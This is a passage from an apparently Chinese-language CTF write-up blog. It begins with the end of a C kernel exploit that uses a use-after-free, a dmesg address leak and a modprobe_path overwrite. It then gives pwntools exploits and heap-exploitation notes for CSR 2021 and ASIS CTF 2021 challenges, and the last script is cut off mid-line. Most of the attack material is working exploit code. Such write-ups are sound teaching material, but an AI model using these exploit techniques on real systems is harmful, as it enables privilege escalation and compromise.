class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MsgBuf</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> mtype;<br>    <span class="hljs-keyword">char</span> mtext[<span class="hljs-number">0x10000</span>]; <span class="hljs-comment">// 65536</span><br>&#125; msgbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msg_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> qid;<br>    <span class="hljs-keyword">if</span> ((qid = msgget(IPC_PRIVATE, <span class="hljs-number">0644</span> | IPC_CREAT)) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgget&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> qid;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_send</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">char</span> *data, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">memcpy</span>(msgbuf.mtext, &amp;data[<span class="hljs-number">0x30</span>], size - <span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">if</span> (msgsnd(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_free</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (msgrcv(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">arb_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">data</span> =</span> &#123;<br>        .index = off,<br>    &#125;;<br><br>    <span class="hljs-comment">// change content</span><br>    msg_free(qid, <span class="hljs-number">0x80</span>);<br>    msg_send(qid, &amp;data, <span class="hljs-number">0x80</span>);<br><br>    query(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">crash</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Crashing...&quot;</span>);<br>    spark_open(<span class="hljs-number">0</span>);<br>    spark_open(<span class="hljs-number">1</span>);<br>    link(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    spark_close(<span class="hljs-number">1</span>);<br>    spark_finalize(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">size_t</span> kernel_stack, kernel_heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        crash();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(<span class="hljs-number">0.5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get info from dmesg\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br>    <span class="hljs-comment">// size_t kernel_heap, kernel_stack;</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!kernel_stack || !kernel_heap); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!kernel_stack &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RSP: 0018:&quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">10</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_stack) != <span class="hljs-number">1</span>)<br>                kernel_stack = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!kernel_heap &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RBX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_heap) != <span class="hljs-number">1</span>)<br>                kernel_heap = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(kernel_stack &amp;&amp; kernel_heap);<br>    <span class="hljs-built_in">free</span>(buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel stack addr: %p\n&quot;</span>, kernel_stack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel heap addr: %p\n&quot;</span>, kernel_heap);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffff98d5cdd2be80:    0xffffffffffffffff    0x000000000088770f</span><br><span class="hljs-comment">0xffff98d5cdd2be90:    0x000000000088770e    0x000000000088770d</span><br><span class="hljs-comment">0xffff98d5cdd2bea0:    0x000000000088770c    0x000000000088770b</span><br><span class="hljs-comment">0xffff98d5cdd2beb0:    0x000000000088770a    0x0000000000887709</span><br><span class="hljs-comment">0xffff98d5cdd2bec0:    0x0093037d5f064f38    0x0000000000887707</span><br><span class="hljs-comment">0xffff98d5cdd2bed0:    0x0000000000887706    0x0000000000887705</span><br><span class="hljs-comment">0xffff98d5cdd2bee0:    0x0000000000887704    0x0000000000887703</span><br><span class="hljs-comment">0xffff98d5cdd2bef0:    0x0000000000887702    0x0000000000887701</span><br><span class="hljs-comment">0xffff98d5cdd2bf00:    0x0000000000000000    0x0000000000000000</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> target_area_size 0x1000000</span><br><span class="hljs-keyword">size_t</span> cushion[target_area_size];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// size_t kernel_heap = strtoull(argv[1],0,16);    // input RBX by hand</span><br>    leak(); <span class="hljs-comment">// change to better way for leak</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">node</span> =</span> &#123;<br>        .id = <span class="hljs-number">0xffffffffffff</span>,<br>        .refcount = <span class="hljs-number">0</span>,<br>        .state_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .finalized = <span class="hljs-number">1</span>,<br>        .nb_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .num_edges = <span class="hljs-number">1</span>,<br>        .link_header.fd = <span class="hljs-number">0x1111</span>,<br>        .link_header.bk = <span class="hljs-number">0x2222</span>,<br>        .index = <span class="hljs-number">0x6666</span>,<br>        .tra = <span class="hljs-number">0</span>,<br>    &#125;;<br><br>    <span class="hljs-keyword">size_t</span> *fake_node = &amp;node;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        spark_open(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x10</span>; ++i)<br>        link(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span> - i, fake_node[<span class="hljs-number">0x10</span> - i]);<br><br>    spark_finalize(<span class="hljs-number">0</span>);<br><br>    spark_open(<span class="hljs-number">20</span>);<br>    spark_open(<span class="hljs-number">21</span>);<br>    spark_open(<span class="hljs-number">22</span>);<br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// link( 20 , 21 , 0x7777777 );      // rip</span><br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">21</span>, shellcode + <span class="hljs-number">4</span>);<br>    spark_close(<span class="hljs-number">21</span>); <span class="hljs-comment">// free node 21</span><br><br>    query(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// overwrite node 21</span><br><br>    spark_finalize(<span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">// get UAF node 21</span><br>    <span class="hljs-keyword">int</span> qid = msg_open();<br>    msg_send(qid, &amp;fake_node, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-keyword">size_t</span> dis_heap_addr = kernel_heap;<br>    dis_heap_addr &amp;= ~(target_area_size - <span class="hljs-number">1</span>);<br>    dis_heap_addr -= target_area_size * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] init heap address of distanse array: %p\n&quot;</span>, dis_heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] cushion addr: %p\n&quot;</span>, cushion);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Searching ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>        cushion[i] = <span class="hljs-number">0x7ffffffffffffff</span>;<br><br>    <span class="hljs-comment">// write to userland</span><br>    <span class="hljs-keyword">size_t</span> addr = ((<span class="hljs-keyword">size_t</span>)cushion - dis_heap_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[+] travsersal addr: %p\n&quot;</span>, addr);<br>    arb_write(qid, addr / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">// find offset</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cushion[i] != <span class="hljs-number">0x7ffffffffffffff</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found at idx:%p content:%p addr:%p\n&quot;</span>, i, cushion[i], &amp;cushion[i]);<br>            dis_heap_addr += i * <span class="hljs-number">8</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] dis_heap_addr: %p\n&quot;</span>, dis_heap_addr);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// overwrite the ret address to shellcode().</span><br>    <span class="hljs-keyword">size_t</span> kernel_ret_addr = kernel_stack + <span class="hljs-number">0xa0</span>;<br>    arb_write(qid, (kernel_ret_addr - dis_heap_addr) / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov rdi, [rsp+0x10];&quot;</span><br>        <span class="hljs-string">&quot;add rdi, 0x11b2097;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, 0x792f706d742f;&quot;</span> <span class="hljs-comment">// &quot;/tmp/y&quot;</span><br>        <span class="hljs-string">&quot;mov [rdi], rsi;&quot;</span>          <span class="hljs-comment">// modprobe_path</span><br>        <span class="hljs-string">&quot;ud2;&quot;</span> ::<br>            :);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h1 id="CSR-2021"><a href="#CSR-2021" class="headerlink" title="CSR 2021"></a>CSR 2021</h1><h2 id="getstat"><a href="#getstat" class="headerlink" title="getstat"></a>getstat</h2><blockquote>
<p>CSR 2021</p>
<p>这个比赛的pwn题好少, 就做个样子. 反而是cry(???)和ethereum较多. 而rev这种还有一题是unity背景, 这个也是不会的…..</p>
<p>不过看了别人的wp还是挺有趣的. </p>
</blockquote>
<p>比较简单, 直接提供shell()函数, 而且PIE. 有canary, 但是没有方法可以leak. 于是就得绕过. 覆盖返回地址.</p>
<p>主要的问题是无符号数输入加上这段:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401109                 lea     rax, [rdx*8]<br>.text:0000000000401111                 and     rax, 0FFFFFFFFFFFFFFF0h<br>.text:0000000000401115                 sub     rsp, rax<br></code></pre></div></td></tr></table></figure>

<p>如果rdx是负数(一致性), 那么rsp减去负数就会增加, 导致栈<strong>收缩</strong>. </p>
<p>直接把rsp收缩到返回地址附近, 此时再覆盖地址即可. </p>
<p>唯一一个新问题是在python中把整数pack成浮点数. 新的方法如下:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">Functions to convert between Python values <span class="hljs-keyword">and</span> C structs.<br>The optional first format <span class="hljs-keyword">char</span> indicates byte order, size <span class="hljs-keyword">and</span> alignment:<br>    @: native order, <span class="hljs-function">size &amp; <span class="hljs-title">alignment</span> <span class="hljs-params">(<span class="hljs-keyword">default</span>)</span></span><br><span class="hljs-function">    </span>=: native order, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &lt;: little-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &gt;: big-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    !: same as &gt;<br><br>The remaining chars indicate types of args <span class="hljs-keyword">and</span> must match exactly;<br>these can be preceded by a decimal repeat count:<br>    x: <span class="hljs-function">pad <span class="hljs-title">byte</span> <span class="hljs-params">(no data)</span></span>; c:<span class="hljs-keyword">char</span>; b:<span class="hljs-keyword">signed</span> byte; B:<span class="hljs-keyword">unsigned</span> byte;<br>    ?: <span class="hljs-built_in">_Bool</span> (<span class="hljs-keyword">requires</span> C99; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">char</span> is used instead)<br>    h:<span class="hljs-keyword">short</span>; H:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>; i:<span class="hljs-keyword">int</span>; I:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>;<br>    l:<span class="hljs-keyword">long</span>; L:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>; f:<span class="hljs-keyword">float</span>; d:<span class="hljs-keyword">double</span>; e:half-<span class="hljs-keyword">float</span>.<br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(preceding decimal count indicates length)</span>:</span><br><span class="hljs-function">    s:<span class="hljs-title">string</span> <span class="hljs-params">(<span class="hljs-built_in">array</span> of <span class="hljs-keyword">char</span>)</span></span>; p: <span class="hljs-function">pascal <span class="hljs-title">string</span> <span class="hljs-params">(with count byte)</span>.</span><br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(only available in native format)</span>:</span><br><span class="hljs-function">    n:<span class="hljs-keyword">ssize_t</span></span>; N:<span class="hljs-keyword">size_t</span>;<br>    P:an integer type that is wide enough to hold a pointer.<br><span class="hljs-function">Special <span class="hljs-title">case</span> <span class="hljs-params">(<span class="hljs-keyword">not</span> in native mode unless <span class="hljs-string">&#x27;long long&#x27;</span> in platform C)</span>:</span><br><span class="hljs-function">    q:<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span></span>; Q:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span><br>Whitespace between formats is ignored.<br></code></pre></div></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br><br>addr = <span class="hljs-number">0x401360</span><br><br>r = process(<span class="hljs-string">&#x27;./getstat&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;-10&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(iToF(addr)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.clean())<br></code></pre></div></td></tr></table></figure>

<hr>
<p>SSE instructions: </p>
<ul>
<li><p>注意的点:</p>
</li>
<li><p>分支分析, 就比如这个输入不符合浮点数的输入就会break. </p>
</li>
<li><p>无符号和有符号运算的一致性…</p>
</li>
</ul>
<h2 id="CSRunner"><a href="#CSRunner" class="headerlink" title="CSRunner"></a>CSRunner</h2><p>图一乐.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Common_Language_Infrastructure">Common Language Infrastructure</a> (CLI)</li>
<li>IL2CPP</li>
</ul>
<h1 id="ASIS-CTF-2021"><a href="#ASIS-CTF-2021" class="headerlink" title="ASIS CTF 2021"></a>ASIS CTF 2021</h1><h2 id="Justpwnit"><a href="#Justpwnit" class="headerlink" title="Justpwnit"></a>Justpwnit</h2><p>no canary PIE. </p>
<p>输入一个负数, 然后覆盖rbp为堆指针, 最终stack pivot到heap上, 最后执行<code>exec(&quot;/bin/sh\x00&quot;, NULL, NULL)</code> </p>
<p>还在纠结system/read&amp;write/sendfile的时候发现还可以用<code>mov qword ptr [rax], rsi ; ret</code>来把/bin/sh写入bss段….</p>
<h2 id="Abbr"><a href="#Abbr" class="headerlink" title="Abbr"></a>Abbr</h2><blockquote>
<p>同上, 分数71, 应该是难一点点</p>
</blockquote>
<ul>
<li><code>strncasecmp</code>: compare two strings ignoring case. </li>
</ul>
<p>注意下stack pivot还可用xchg指令…. 可以刚好找到xchg esp, eax. 又因为PIE已关, 所以4字节能够装下bss和heap段的地址. </p>
<p>不过看到另一个exp里确实绕了一大圈使用了printf的任意读能力leak出地址. 有点复杂了. </p>
<h2 id="strvec"><a href="#strvec" class="headerlink" title="strvec"></a>strvec</h2><blockquote>
<p>github <a target="_blank" rel="noopener" href="https://github.com/kam1tsur3/2021_CTF/tree/master/asis/pwn/strvec">src</a>, 114 points</p>
</blockquote>
<p>找漏洞的过程完全就是一个人脑fuzzing…</p>
<p>保护全开. 大体思路仍来自别人的wp….</p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>好了, 是下面代码的一个整数溢出, 可以做到一个很大的vec-&gt;size以及很小的malloc(size)</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-built_in">vector</span> *<span class="hljs-title">vector_new</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nmemb)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (nmemb &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">vector</span>) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*) * nmemb;    <span class="hljs-comment">//8+8*n = 8*(n+1)</span><br>                                                        <span class="hljs-comment">//0x40000004</span><br>  <span class="hljs-built_in">vector</span> *vec = (<span class="hljs-built_in">vector</span>*)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> (!vec)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">memset</span>(vec, <span class="hljs-number">0</span>, size);<br>  vec-&gt;size = nmemb;<br>  <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这样的话get和set两个函数在一定范围内都没有了限制, 不过只能get heap段之后的地址区域. 好像只有heap了…</p>
<h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>到现在get了一个arbitrary read. 可以leak一下堆地址, 方法是通过get已释放的chunk的tcache链表指针. </p>
<p>然后呢?不知道了, 卡了半天, 没想到经验是如此的不足, 知道下一步是leak libc还是想不出来怎么做. </p>
<p>好吧现在想出来了, 就是靠伪造一个chunk然后再释放加入unsortedbin中就可以读取fd指针, 从而获得libc_base.</p>
<h3 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h3><p>方法是释放tcache struct, 放到unsorted bin中, 方法是先填满0x290大小的tcache链表, 使得再次free tcache struct的时候可以进入unsorted bin, 进而让fd和bk指针覆盖0x30的count变成一个很大的数值, 使得可以在tcache链上malloc任意数量的伪造的tcache fd指针, 最终分配到<code>__malloc_hook</code>, 实现修改下一次malloc时的流程控制.</p>
<p>卡了一会儿的是差点忘了释放0x420的chunk的时候会尝试前后合并, 而0x421会阻止后向合并, 此时必须设置好nextchunk的nextsize_inuse位, 以阻止前向合并. </p>
<h3 id="Pop-a-shell"><a href="#Pop-a-shell" class="headerlink" title="Pop a shell"></a>Pop a shell</h3><p>可以使用ROP的方式, 不过有canary的限制, 在此之前还要知道stack和canary的值. </p>
<p>更简单的方法是使用one_gadget一一检查有无满足对应条件的gadget, 这样只要覆盖malloc_hook到对应gadget地址即可.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./strvec.elf64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(binary, aslr=<span class="hljs-literal">False</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span 